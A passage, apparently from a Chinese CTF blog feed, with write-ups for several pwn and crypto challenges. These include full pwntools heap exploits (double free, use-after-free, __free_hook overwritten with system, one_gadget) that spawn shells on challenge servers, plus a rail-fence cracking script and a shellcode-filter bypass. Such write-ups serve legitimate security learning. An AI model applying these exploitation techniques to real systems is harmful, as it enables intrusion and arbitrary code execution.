class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;2.Remove a candy:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10000</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Taste: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;2.Remove a candy:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./candyBox&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x31\0&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(p32(<span class="number">0x9a0</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;%4$p&#x27;</span>+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x5ed700</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sys=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;malloc_hook:&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x31</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>下面是成功getshell的截图，最后写出来需要爆破的就是printf那半个字节，跑到远程环境注意一下应该问题不大。</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/6.png" alt="6"></p><h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>本题目来源于zjctf2020决赛的pwn2，据说那题也没多少人做出来，而我虽然能自己独立做出来，但是整整花了9个小时，听说去年决赛总共也就8个小时qwq。</p><p>这真的是我做过的最难的uaf漏洞的题目了，我原本以为它应该就跟那种没有任何特殊字符过滤的sql注入差不多，没想到它到处加限制导致很多漏洞很难利用，也算是给我展示了一波吧，希望这次的省赛能让我出一道pwn吧，加油冲冲冲！</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gyctf_2020_document write up</title>
      <link href="/2021/10/26/gyctf_2020_document/"/>
      <url>/2021/10/26/gyctf_2020_document/</url>
      
        <content type="html"><![CDATA[<p>今天来康康这道题<a href="https://buuoj.cn/challenges#gyctf_2020_document">gyctf_2020_document</a></p><span id="more"></span><h2 id="静态分析确定漏洞类型"><a href="#静态分析确定漏洞类型" class="headerlink" title="静态分析确定漏洞类型"></a>静态分析确定漏洞类型</h2><p>经典的堆菜单题，保护全开，2.23的libc。保护全开意味着got表劫持不了。增删改查四样动作都有，并且没有那种虚晃一枪(例如show函数直接给你puts一个too young too simple之类的)的函数。</p><p>先看add函数，malloc了两个堆块，都是固定大小，一个堆块是0x20大小，另一个是0x90大小。然后第二个堆块的指针存在了第一个堆块上面。第一个堆块后八个字节用来存了性别，性别要么1要么16，是通过判断你输入的是否为W来决定的。之后就是那个0x90的大堆块上面存一个名字，中间间隔一个flag，然后堆块偏移0x10的位置上面放上你要输入的内容。</p><p>看看delete函数，存在明显 的UAF漏洞，可以操作free的堆块。并且只free 0x90的堆块而0x20的堆块不会free。那么通过这些分析我们就可以先add两个堆块，free掉第一个之后show第一个就能泄露出libc的地址。</p><p>其它的中规中矩，唯独edit函数正常情况下它每个堆块只允许edit一次，但也只是因为那个0x20堆块的后面的那个flag原因。</p><h2 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h2><p>这里建议，name强制8位就不要想这么多直接给<code>/bin/sh;</code>就完了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;/bin/sh;&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">b&#x27;/bin/sh;&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>得到libc地址</p><p><img src="/2021/10/26/gyctf_2020_document/1.png" alt="1"></p><h2 id="确定攻击思路"><a href="#确定攻击思路" class="headerlink" title="确定攻击思路"></a>确定攻击思路</h2><p>构造堆重叠以此能修改0x20堆块上面的指针到<code>free_hook</code>去覆盖<code>free_hook</code>为system函数，再free一个带有/bin/sh的堆块就可以getshell，此时bin中已经有一个0x90的<code>unsorted bin</code>，再次add一个因为先分配了这个0x20的堆块，<code>unsorted bin</code>就会进行切割，但是edit 0发现它在0x10偏移上edit的，因此不行。不行咱就再换一个嘛，再add一次，此时的<code>unsorted bin</code>会进入smallbin，但是不影响，还是从上面切割下来作为第四组的小块。然后edit第0个块把这个块的指针改成<code>free_hook</code>。此时第四个堆块的指针被改成了<code>free_hook</code>，那么此时再edit 3为system即可。实际测试需要考虑它在读数据之后会写在那个指针偏移0x10的地方写数据，所以前面我们edit的时候也把它改成<code>free_hook</code>-0x10。最后edit 3 为system函数。由于这个输入是for() read(0,buf,1)读取的，因此0x70个字节必须写满，那边由于都是hook，我们都清空较为保险，因为万一不小心调用到了那边的hook很容易crash，那么exp根据以上思路很容易得到了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">def conn(x,file_name):</span><br><span class="line">    if x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-64.so&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        p=remote(&#x27;node4.buuoj.cn&#x27;,26476)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-buu64.so&#x27;)</span><br><span class="line">    return ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line">def add(name,sex,payload):#8,1,0x70</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;1&#x27;)</span><br><span class="line">    p.sendafter(b&#x27;name&#x27;,name)</span><br><span class="line">    p.sendafter(b&#x27;sex&#x27;,sex,timeout=0.01)</span><br><span class="line">    p.sendafter(b&#x27;information&#x27;,payload)</span><br><span class="line">    </span><br><span class="line">def edit(index,sex,payload):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index&#x27;,str(index))</span><br><span class="line">    if sex:p.sendlineafter(b&#x27;?&#x27;,b&#x27;Y&#x27;)</span><br><span class="line">    else:p.sendlineafter(b&#x27;?&#x27;,&#x27;N&#x27;)</span><br><span class="line">    p.sendafter(b&#x27;information&#x27;,payload)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index :&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(0,&#x27;./gyctf_2020_document&#x27;)</span><br><span class="line"></span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;a&#x27;*0x70)</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;b&#x27;*0x70)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_addr=u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\0&#x27;))-88-0x10-libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">success(&#x27;libc:&#x27;+hex(libc_addr))</span><br><span class="line">success(&#x27;free_hook&#x27;+hex(libc_addr+libc.sym[&#x27;__free_hook&#x27;]))</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;c&#x27;*0x70)</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;d&#x27;*0x70)</span><br><span class="line">edit(0,0,b&#x27;d&#x27;*0x10+p64(libc_addr+libc.sym[&#x27;__free_hook&#x27;]-0x10)+b&#x27;d&#x27;*0x58)</span><br><span class="line">edit(3,0,p64(libc_addr+libc.sym[&#x27;system&#x27;])+b&#x27;e&#x27;*0x68)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2021/10/26/gyctf_2020_document/2.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021浙江省预赛</title>
      <link href="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/"/>
      <url>/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>作者因为之前电脑丢了导致中间两个月断更，最近会把之前的很多都补回来。言归正传，这次比赛总体来说不太理想，没有达到预期。</p><span id="more"></span><h2 id="比赛情况总结"><a href="#比赛情况总结" class="headerlink" title="比赛情况总结"></a>比赛情况总结</h2><p>我，学姐，学长分别出一题，最终得分350，排名在42。而我是出了一道密码题，pwn题没出，因为pwn题一道shellcode题当时分析没有考虑\0截断的这个特性，以为所有shellcode都要满足这个特性，觉得手撕汇编撕不过，就放弃了，没想到竟是一个\0绕过，这波，属实大意了闪了。</p><h2 id="部分题目writeup"><a href="#部分题目writeup" class="headerlink" title="部分题目writeup"></a>部分题目writeup</h2><h3 id="Crypto-Easy-Railfence"><a href="#Crypto-Easy-Railfence" class="headerlink" title="Crypto-Easy Railfence"></a>Crypto-Easy Railfence</h3><p>观察加密方式，发现这个加密只进行了位置对换，并且开头特意提醒flag的形式为 flag{} ，那么先根据 已有长度写出参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&#x27;flag&#123;_________________________________________________________&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>现在Rail和offset不确定，但是 flag的格式确定，因此对参数进行爆破，然后观察发现l和g还有{}在整个 给的加密结果中只有一个并且位置已经确定，那么根据这个特性写出如下脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encrypt函数将结尾的print (d)改成了return d</span></span><br><span class="line"><span class="keyword">for</span> Rail <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> Offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">if</span> encrypt(m, Rail , Offset)[<span class="number">23</span>:<span class="number">25</span>]==<span class="string">&#x27;&#125;l&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(Rail,Offset)</span><br></pre></td></tr></table></figure><p>得到两个结果 13 5和13 29，填充位位数多了应该有一定的规律，因此offset取5即可。</p><p> 由于这个加密方式只交换位置，因此我在某一位多的一个字符必然会在另一个位置一模一样的出现，将 已匹配的字符数作为该为有没有匹配的条件逐位爆破即可，以下为完整脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">target=<span class="string">&#x27;reetdrvhns0eutbftafmeon&#125;linnd=a1cOh!gcedos&#123;neuwkYav0irOceytounw&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">c,rails,offset</span>):</span></span><br><span class="line">    c = <span class="string">&#x27;$&#x27;</span> * offset + c</span><br><span class="line">    length = <span class="built_in">len</span>(c)</span><br><span class="line">    result = &#123;x: <span class="string">&quot;&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(rails)&#125;</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        width = rails * <span class="number">2</span> - <span class="number">2</span></span><br><span class="line">        num = a % width</span><br><span class="line">        <span class="keyword">if</span> (num &lt; rails):</span><br><span class="line">            result.update(&#123;num: result[num] + c[a]&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ll = <span class="number">2</span> * rails - <span class="number">2</span> - num</span><br><span class="line">            result.update(&#123;ll: result[ll] + c[a]&#125;)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(rails):</span><br><span class="line">        d = d + result[k]</span><br><span class="line">    d = d.replace(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span>(<span class="params">str1,str2</span>):</span></span><br><span class="line">    ans=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span>(str1[i]==str2[i]):ans+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">Rail=<span class="number">13</span></span><br><span class="line">Offset=<span class="number">5</span></span><br><span class="line">m=<span class="string">&#x27;flag&#123;_________________________________________________________&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for Rail in range(2,20):</span></span><br><span class="line"><span class="string">    for Offset in range(0,30):</span></span><br><span class="line"><span class="string">        if encrypt(m, Rail , Offset)[23:25]==&#x27;&#125;l&#x27;:</span></span><br><span class="line"><span class="string">            print(Rail,Offset)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">63</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        m=m[:i]+<span class="built_in">chr</span>(j)+m[i+<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> compare(target,encrypt(m, Rail , Offset))==i+<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/1.png" alt="1"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;YOucanc1imb0verthefenceeveny0udOnotunderstandhowitworks!=&#125;</span><br></pre></td></tr></table></figure><p>再放工具md5即可。</p><p>可能是固定的算法思维吧，就只想到这个，忘了有工具这种东西了。参数解出来放在CyberChef中可以直接一把梭。</p><h3 id="pwn-sx"><a href="#pwn-sx" class="headerlink" title="pwn-sx"></a>pwn-sx</h3><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/2.png" alt="2"></p><p>分析文件是一道shellcode 题目，然后输入的shellcode经过传参到这个函数来判断是否合法，我以为都要满足，然后小算了一下发现限制很多，分组限制，当时我挺绝望的，想着这谁能做啊。可是结束之后我才想到可以\0字节绕过判断后面直接跟上shellcode ，只要保证前面能正确执行指令满足那些条件就可以。这里需要用到CyberChef工具中的disassemble，可以直接根据字节码转出来汇编指令，只要执行不产生异常，不让它指令偏移那就都可以放上来。</p><p>小算一波，发现下标%3=0的字节只能在[0xc0-0xff]范围内，%3=1和%3=2的则在0x80-0xbf的范围内。那就一个个指令尝试过去，最后发现一个很合适的。</p><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/3.png" alt="3"></p><p>执行完之后刚好能在最后一个00字节之后，后面填上shellcode直接打就结束了，下面附上本地运行结果。</p><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/4.png" alt="4"></p><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/5.png" alt="5"></p><p>经过本次比赛，也意识到自己的不足应该是这些基础知识，算法优势应当好好利用起来去破密码试试看。总之，初赛过去，就得看向决赛了，争取在决赛上能一鸣惊人，加油！</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>babyfengshui_33c3_2016 writeup</title>
      <link href="/2021/08/15/babyfengshui_33c3_2016%20writeup/"/>
      <url>/2021/08/15/babyfengshui_33c3_2016%20writeup/</url>
      
        <content type="html"><![CDATA[<p>好久没有更新博客了，因为作者太懒了，又懒又菜，今天来康康这道题，buuoj的<a href="https://buuoj.cn/challenges#babyfengshui_33c3_2016">babyfengshui_33c3_2016</a></p><span id="more"></span><h2 id="分析elf文件"><a href="#分析elf文件" class="headerlink" title="分析elf文件"></a>分析elf文件</h2><p>checksec一下发现canary保护和NX保护，got表没有保护，且随即地址没有开启。这就意味着got表可写，拖到IDA当中发现是一个经典的堆菜单题，以我现在的水平，那就是先分析它free后指针有无清零。本来一开始看它free了两个堆块，确指将一个指针清零了，以为是有uaf漏洞，但是后面发现不是这样的，它每一条目分一个name和对应的description，name且dscription是用指针指示，并且每个条目固定是80字节的大小，因此可以把一个条目看成一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">0x7c</span>];</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以，我把整个结构体free了之后就相当于把这个description的指针清零了，因此本题不存在uaf漏洞。再观察添加一个项目的函数，发现name是固定长度输入，且用了fgets函数限定输入0x7c字节，整个name那就是不可能溢出了，就连off by null漏洞都不存在。那么这样的话只能看看edit函数了，edit函数它在之前if也会有一个长度输入，并且用了下面这一句if判断，如果为真就直接退出系统</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="keyword">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="keyword">char</span> *)*(&amp;ptr + a1) - <span class="number">4</span> )</span><br></pre></td></tr></table></figure><p>它这个是什么意思呢，翻译成c语言大概就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">heap *item</span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(item-&gt;description+length&gt;=item<span class="number">-4</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果它们的地址之差小于输入的长度，那就退出，如果长度溢出到那个结构体堆块的metadata，那就退出。</p><p>看似这个也不能溢出，但是实际上这个能用一个方法绕过。因为如果我们直接分配堆块的话，它们物理地址是相邻的，但是如果它们不物理相邻，中间隔了一个堆块，那就可以任意溢出中间的堆块了。并且got表可写，我们是通过指针找到description的，如果把它溢出改成got表的地址，那么在edit的时候就可以修改got表的条目了。那么我们修改哪个？把free改成system，那么在free(item-&gt;description)的时候就会变成system(item-&gt;description)，如果把item-&gt;description的内容改成”/bin/sh”，那么就可以愉快的getshell了。</p><p>这便是分析elf文件得到的信息。</p><h2 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h2><p>先构造交互函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25740</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,size,k,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;description: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(k).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span 